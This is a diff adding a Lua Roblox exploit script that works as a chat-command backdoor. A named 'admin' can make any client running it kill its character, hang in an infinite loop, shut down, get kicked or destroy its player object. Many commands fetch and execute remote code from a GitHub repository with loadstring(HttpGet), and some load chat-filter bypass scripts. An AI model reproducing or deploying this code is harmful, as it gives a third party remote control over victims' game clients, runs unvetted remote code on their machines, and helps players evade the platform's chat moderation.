@@ -1,0 +1,109 @@
+getgenv().UserName = "1mpulseYouTube" -- Your Roblox username here --
+getgenv().Prefix = "$" -- Your prefix here --
+
+local RPL = game:GetService("ReplicatedStorage")
+local onMsgDefFil = RPL.DefaultChatSystemChatEvents.OnMessageDoneFiltering
+local prf = getgenv().Prefix
+local admin = getgenv().UserName
+
+_G.Following = false
+
+onMsgDefFil.OnClientEvent:Connect(function(message)
+local msg, sender = message.Message, message.FromSpeaker
+if sender == admin then
+if msg == (prf.."kill") then
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+
+elseif msg == (prf.."crash") or msg == (prf.."troll") then
+while true do end
+
+elseif msg == (prf.."shutdown") then
+game:Shutdown()
+
+
+elseif msg == (prf.."night") then
+ game.Lighting.ClockTime = 0
+ 
+ 
+ elseif msg == (prf.."day") then
+  game.Lighting.ClockTime = 10
+  
+  
+elseif msg == (prf.."banish") then
+Game.Players.LocalPlayer:Destroy()
+
+
+elseif msg == (prf.."log") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/ResetScript'))()
+
+ elseif msg == (prf.."jumpscareaudio") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/Sound%20Effect'))()
+elseif msg == (prf.."alwayslog") then --logs until they leave the game
+while true do
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/ResetScript'))()
+    end
+
+elseif msg == (prf.. "antiskid") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/Rejoin%20Script'))()
+
+
+elseif msg == (prf.. "floodworkspace") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/Kill%20Script'))()
+
+
+elseif msg == (prf.. "kick") then
+    Game.Players.LocalPlayer:Kick('get kicked noob')
+    
+elseif msg == (prf.. "disconnect") then
+    workspace.FilteringEnabled = game:GetService("NetworkServer")
+    
+elseif msg == (prf.. "soundspam") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/Sound%20Spam'))()
+    
+elseif msg == (prf.. "test") then -- test command nothing special
+    print("test") --prints on THEIR CONSOLE not admins
+    
+
+elseif msg == (prf.."nogravity") then
+workspace.Gravity = 0 -- jump to go to the moon!
+
+elseif msg == (prf.. "rconsole") then
+rconsolename('hey')
+rconsoleprint('@@LIGHT_CYAN@@')
+rconsoleprint(' hiaiais ')
+
+
+elseif msg == (prf.."chatbypass") or msg == (prf.."safechatbypass") or msg == (prf.."bypasschat") or msg == (prf.."bypass") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/chatbypass'))()
+
+elseif msg == (prf.."unsafechatbypass") or msg == (prf.."banriskchatbypass") or msg == (prf.."riskybypass") then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AmongusGaming/babaji/main/chatbypass2'))()
+    
+    
+elseif msg == (prf.."blockhead") then
+Game.Players.LocalPlayer.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
+    
+elseif msg == (prf.."bring") then
+local plrs = game:GetService("Players")
+plrs.LocalPlayer.Character.HumanoidRootPart.CFrame = plrs[admin].Character.HumanoidRootPart.CFrame
+
+elseif msg == (prf.."speedy") or msg == (prf.."walkspeed") or msg == (prf.."ws") then
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 200
+
+
+elseif msg == (prf.."normalws") then
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+
+elseif msg == (prf.."rj") then
+game.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
+
+elseif msg == (prf.."follow") then
+if _G.Following == true then
+_G.Following = false else _G.Following = true end
+end end end)
+
+task.spawn(function() while _G.Following == true do task.wait()
+local plrs = game.Players local plr = plrs.LocalPlayer local char = plr.Character
+char.Humanoid:MoveTo(plrs[admin].Character.HumanoidRootPart.Position)
+end end)
+--loadstring format yes yes --loadstring(game:HttpGet('thingy'))()--
